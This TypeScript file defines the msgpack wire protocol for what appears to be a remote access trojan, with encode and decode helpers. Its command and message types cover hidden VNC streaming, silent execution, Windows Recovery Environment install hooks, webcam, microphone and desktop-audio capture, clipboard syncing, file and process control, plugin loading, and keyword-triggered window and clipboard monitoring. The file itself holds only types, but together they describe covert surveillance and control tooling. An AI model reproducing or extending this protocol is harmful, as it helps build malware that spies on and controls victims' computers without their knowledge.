import { encode, decode } from "@msgpack/msgpack";

export type MessageKind =
  | "hello"
  | "hello_ack"
  | "ping"
  | "pong"
  | "command"
  | "command_result"
  | "screenshot_result"
  | "frame"
  | "status"
  | "plugin_event"
  | "notification"
  | "webcam_devices"
  | "notification_config"
  | "enrollment_challenge"
  | "enrollment_status";

export type Hello = {
  type: "hello";
  id: string;
  host: string;
  os: string;
  arch: string;
  version: string;
  user: string;
  monitors: number;
  monitorInfo?: { width: number; height: number }[];
  country?: string;
  publicKey?: string;
  signature?: string;
};

export type EnrollmentChallenge = {
  type: "enrollment_challenge";
  nonce: string;
};

export type EnrollmentStatusMsg = {
  type: "enrollment_status";
  status: "pending" | "approved" | "denied";
};

export type HelloAck = {
  type: "hello_ack";
  id: string;
  commands?: Command[];
  notification?: {
    keywords: string[];
    minIntervalMs?: number;
    clipboardEnabled?: boolean;
  };
};
export type Ping = { type: "ping"; ts?: number };
export type Pong = { type: "pong"; ts?: number };

export type CommandType =
  | "input"
  | "remote_start"
  | "remote_stop"
  | "webcam_start"
  | "webcam_stop"
  | "webcam_list"
  | "webcam_select"
  | "webcam_set_fps"
  | "disconnect"
  | "reconnect"
  | "screenshot"
  | "ping"
  | "console_start"
  | "console_input"
  | "console_stop"
  | "console_resize"
  | "file_list"
  | "file_download"
  | "file_upload"
  | "file_delete"
  | "file_mkdir"
  | "file_zip"
  | "file_read"
  | "file_write"
  | "file_search"
  | "file_copy"
  | "file_move"
  | "file_chmod"
  | "file_execute"
  | "silent_exec"
  | "voice_session_start"
  | "voice_session_stop"
  | "voice_downlink"
  | "voice_capabilities"
  | "desktop_audio_start"
  | "desktop_audio_stop"
  | "process_list"
  | "process_kill"
  | "plugin_load"
  | "plugin_load_init"
  | "plugin_load_chunk"
  | "plugin_load_finish"
  | "plugin_unload"
  | "agent_update"
  | "clipboard_set"
  | "clipboard_sync_start"
  | "clipboard_sync_stop"
  | "winre_install"
  | "winre_uninstall";

export type Command = {
  type: "command";
  commandType: CommandType;
  payload?: unknown;
  id?: string;
};

export type CommandResult = {
  type: "command_result";
  commandId?: string;
  ok: boolean;
  message?: string;
};

export type ScreenshotResult = {
  type: "screenshot_result";
  commandId?: string;
  format: "jpeg" | "webp" | "png" | string;
  width?: number;
  height?: number;
  data: Uint8Array;
  error?: string;
};

export type FrameHeader = {
  monitor: number;
  fps: number;
  format: "jpeg" | "webp" | "raw" | "h264";
  hash?: string;
  hvnc?: boolean;
  webcam?: boolean;
};

export type Frame = { type: "frame"; header: FrameHeader; data: Uint8Array };
export type FrameAck = { type: "frame_ack" };
export type Status = {
  type: "status";
  state: "idle" | "streaming" | "error";
  detail?: string;
};

export type WebcamDevice = {
  index: number;
  name: string;
  maxFps?: number;
};

export type WebcamDevices = {
  type: "webcam_devices";
  devices: WebcamDevice[];
  selected: number;
};
export type ConsoleOutput = {
  type: "console_output";
  sessionId: string;
  data?: Uint8Array;
  exitCode?: number;
  error?: string;
};

export type FileEntry = {
  name: string;
  path: string;
  isDir: boolean;
  size: number;
  modTime: number;
  mode?: string;
  owner?: string;
  group?: string;
};

export type FileListResult = {
  type: "file_list_result";
  commandId?: string;
  path: string;
  entries: FileEntry[];
  error?: string;
};

export type FileDownload = {
  type: "file_download";
  commandId?: string;
  path: string;
  data: Uint8Array;
  offset: number;
  total: number;
  chunkIndex?: number;
  chunksTotal?: number;
  error?: string;
};

export type FileUploadResult = {
  type: "file_upload_result";
  commandId?: string;
  transferId?: string;
  path: string;
  ok: boolean;
  offset?: number;
  size?: number;
  received?: number;
  total?: number;
  error?: string;
};

export type ProcessInfo = {
  pid: number;
  ppid: number;
  name: string;
  cpu: number;
  memory: number;
  username?: string;
  type?: string;
};

export type ProcessListResult = {
  type: "process_list_result";
  commandId?: string;
  processes: ProcessInfo[];
  error?: string;
};

export type FileReadResult = {
  type: "file_read_result";
  commandId?: string;
  path: string;
  content: string;
  isBinary: boolean;
  error?: string;
};

export type FileSearchResult = {
  type: "file_search_result";
  commandId?: string;
  searchId: string;
  results: Array<{
    path: string;
    line?: number;
    match?: string;
  }>;
  complete: boolean;
  error?: string;
};

export type ScriptResult = {
  type: "script_result";
  commandId?: string;
  ok: boolean;
  output?: string;
  error?: string;
};

export type PluginManifest = {
  id: string;
  name: string;
  version?: string;
  description?: string;
  binary?: string;
  binaries?: Record<string, string>;
  entry?: string;
  assets?: {
    html?: string;
    css?: string;
    js?: string;
  };
};

export type PluginSignatureInfo = {
  signed: boolean;
  trusted: boolean;
  valid: boolean;
  fingerprint?: string;
  algorithm?: string;
};

export type PluginEvent = {
  type: "plugin_event";
  pluginId: string;
  event: string;
  payload?: unknown;
  error?: string;
};

export type NotificationEvent = {
  type: "notification";
  category: "active_window";
  title: string;
  process?: string;
  processPath?: string;
  pid?: number;
  keyword?: string;
  ts?: number;
};

export type NotificationConfig = {
  type: "notification_config";
  keywords: string[];
  minIntervalMs?: number;
  clipboardEnabled?: boolean;
};

export type WireMessage =
  | Hello
  | HelloAck
  | Ping
  | Pong
  | Command
  | CommandResult
  | ScreenshotResult
  | Frame
  | FrameAck
  | Status
  | ConsoleOutput
  | FileListResult
  | FileDownload
  | FileUploadResult
  | ProcessListResult
  | FileReadResult
  | FileSearchResult
  | ScriptResult
  | PluginEvent
  | NotificationEvent
  | NotificationConfig
  | EnrollmentChallenge
  | EnrollmentStatusMsg;

export function encodeMessage(msg: WireMessage): Uint8Array {
  return encode(msg);
}

export function decodeMessage(
  input: Uint8Array | ArrayBuffer | string,
): WireMessage {
  if (typeof input === "string") {
    return JSON.parse(input) as WireMessage;
  }
  return decode(input) as WireMessage;
}
